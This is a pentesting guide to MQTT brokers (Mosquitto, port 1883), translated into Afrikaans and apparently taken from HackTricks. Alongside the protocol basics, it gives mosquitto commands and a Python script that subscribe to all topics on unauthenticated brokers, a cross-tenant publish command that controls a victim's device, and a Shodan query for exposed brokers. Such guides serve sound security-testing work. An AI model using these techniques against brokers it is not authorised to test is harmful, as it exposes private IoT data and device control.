# 1883 - Pentesting MQTT (Mosquitto)

{{#include ../banners/hacktricks-training.md}}

## Basiese Inligting

**MQ Telemetry Transport (MQTT)** staan bekend as 'n publish/subscribe boodskapprotokol wat uitstaan deur sy uiterste eenvoud en ligtheid. Hierdie protokol is spesifiek ontwerp vir omgewings waar toestelle beperkte vermoëns het en werk oor netwerke wat gekenmerk word deur lae bandwydte, hoë latensie, of onbetroubare verbindings. Die kerndoelwitte van MQTT sluit in die minimalisering van netwerkbandwydtegebruik en die vermindering van hulpbronvereistes op toestelle. Daarbenewens poog dit om betroubare kommunikasie te handhaaf en 'n mate van afleweringsversekering te bied. Hierdie doelwitte maak MQTT uiters geskik vir die vinnig groeiende veld van masjien-tot-masjien (M2M) kommunikasie en die Internet van Dinge (IoT), waar dit noodsaaklik is om 'n menigte toestelle doeltreffend te koppel. Verder is MQTT baie nuttig vir mobiele toepassings, waar die besparing van bandwydte en batterylewe kritiek is.

**Standaard poort:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Inspekteer die verkeer

Wanneer 'n **CONNECT** pakket deur MQTT brokers ontvang word, word 'n **CONNACK** pakket teruggestuur. Hierdie pakket bevat 'n return code wat deurslaggewend is vir die begrip van die konneksiestatus. 'n return code van **0x00** beteken dat die inlogbewyse aanvaar is, wat 'n suksesvolle konneksie aandui. Aan die ander kant dui 'n return code van **0x05** aan dat die inlogbewyse ongeldig is, en so die konneksie verhoed.

Byvoorbeeld, as die broker die konneksie weier weens ongeldige inlogbewyse, sou die scenario ongeveer so lyk:
```
{
"returnCode": "0x05",
"description": "Connection Refused, not authorized"
}
```
![](<../images/image (976).png>)

### [**Brute-Force MQTT**](../generic-hacking/brute-force.md#mqtt)

## Pentesting MQTT

**Outentisering is heeltemal opsioneel** en selfs as outentisering uitgevoer word, **enkripsie word nie standaard gebruik nie** (inlogbesonderhede word in platte teks gestuur). MITM-aanvalle kan steeds uitgevoer word om wagwoorde te steel.

Om aan 'n MQTT-diens te koppel, kan jy gebruik maak van: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) en teken in op al die topics deur:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Jy kan ook gebruik maak van [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)

Jy kan ook gebruik maak van:
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscribe to 'test/topic'
mosquitto_sub -h <host-ip> -t "#" -v #Subscribe to ALL topics.
```
Of jy kan ook **hierdie kode uitvoer om te probeer koppel aan 'n MQTT-diens sonder outentisering, op elke topic te subscribe en daarna na hulle te luister**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
client.subscribe('#', qos=1)
client.subscribe('$SYS/index.html#')

def on_message(client, userdata, message):
print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect(HOST, PORT)
client.loop_start()
#time.sleep(10)
#client.loop_stop()

if __name__ == "__main__":
main()
```
### The Publish/Subscribe Pattern <a href="#b667" id="b667"></a>

Die publish/subscribe-model bestaan uit:

- **Publisher**: publiseer 'n boodskap na een (of verskeie) topic(s) in die broker.
- **Subscriber**: subscrive na een (of verskeie) topic(s) in die broker en ontvang al die boodskappe wat deur die publisher gestuur word.
- **Broker**: routeer alle boodskappe van die publishers na die subscribers.
- **Topic**: bestaan uit een of meer vlakke wat geskei word deur 'n voorwaartse skuinsstreep (bv. /smartshouse/livingroom/temperature).

### Packet Format <a href="#f15a" id="f15a"></a>

Elke MQTT-pakket bevat 'n vaste header (Figure 02).Figuur 02: Vaste Header

![https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png](https://miro.medium.com/max/838/1*k6RkAHEk0576geQGUcKSTA.png)

### Packet Types

- CONNECT (1): Begin deur die kliënt om 'n verbinding met die bediener te versoek.
- CONNACK (2): Die bediener se bevestiging van 'n suksesvolle verbinding.
- PUBLISH (3): Word gebruik om 'n boodskap van die kliënt na die bediener te stuur, of andersom.
- PUBACK (4): Bevestiging van 'n PUBLISH-pakket.
- PUBREC (5): Deel van 'n boodskapafleweringsprotokol wat verseker dat die boodskap ontvang is.
- PUBREL (6): Verdere versekering in boodskapaflewering, wat 'n vrylating van die boodskap aandui.
- PUBCOMP (7): Finale deel van die boodskapafleweringsprotokol wat voltooiing aandui.
- SUBSCRIBE (8): 'n Kliënt se versoek om na boodskappe van 'n topic te luister.
- SUBACK (9): Die bediener se bevestiging van 'n SUBSCRIBE-versoek.
- UNSUBSCRIBE (10): 'n Kliënt se versoek om op te hou om boodskappe van 'n topic te ontvang.
- UNSUBACK (11): Die bediener se reaksie op 'n UNSUBSCRIBE-versoek.
- PINGREQ (12): 'n Hartklopboodskap wat deur die kliënt gestuur word.
- PINGRESP (13): Die bediener se reaksie op die hartklopboodskap.
- DISCONNECT (14): Begin deur die kliënt om die verbinding te beëindig.
- Twee waardes, 0 en 15, is as gereserveer gemerk en hul gebruik is verbode.

## IoT MQTT ecosystem attacks: plaintext brokers and topic ACL bypass

Baie verbruikers-IoT-platforms openbaar MQTT-brokers wat deur twee onderskeibare rolle gebruik word:
- Gateway/hub-toestelle wat radio-protokolle (bv. BLE/LoRa/Zigbee) na die cloud oorbrug.
- Mobile apps of web backends wat toestelle beheer via “app” topics.

Algemene swakhede wat jy tydens 'n pentest kan misbruik:

- Plaintext MQTT oor nie-standaard poorte (bv. TCP/8001) in plaas van MQTTS. Enige on-path waarnemer kan credentials en control frames lees. Gebruik Wireshark om duidelike CONNECT/CONNACK en SUBSCRIBE/PUBLISH-verkeer op ongebruiklike poorte te identifiseer.
- Swak of ontbrekende per-tenant topic ACLs. As topics slegs deur deviceId genamespaceer is (bv. "/tenantless/<deviceId>/tx"), kan enige geauthentiseerde gebruiker moontlik PUBLISH na ander tenants se toestelle doen.
- Sensitiewe data leak via maintenance/admin topics (bv. Wi‑Fi credentials wat in cleartext uitgesaai word na konfigurasiewissings).

Examples (replace placeholders with real values):

Teken in op potensieel sensitiewe topics met bekende topic-prefikse en device IDs:
```bash
# Using mosquitto_sub
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
Kruis-tenant beheer wanneer ACLs swak is (publiseer na ’n ander tenant se device-topic):
```bash
mosquitto_pub -h <app-broker> -p <port> -V mqttv311 \
-i <your_client_id> -u <your_username> -P <your_password> \
-t "/ys/<victimDeviceId>/tx" \
-m '{"method":"Device.setState","params":{"state":{"power":"on"}},"targetDevice":"<victimDeviceId>"}'
```
## Shodan

- `port:1883 MQTT`
- MQTT plaintext op nie-standaard poorte is algemeen in IoT. Oorweeg om na brokers op alternatiewe poorte te soek en dit met protocol detection te bevestig.

## Verwysings

- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

{{#include ../banners/hacktricks-training.md}}
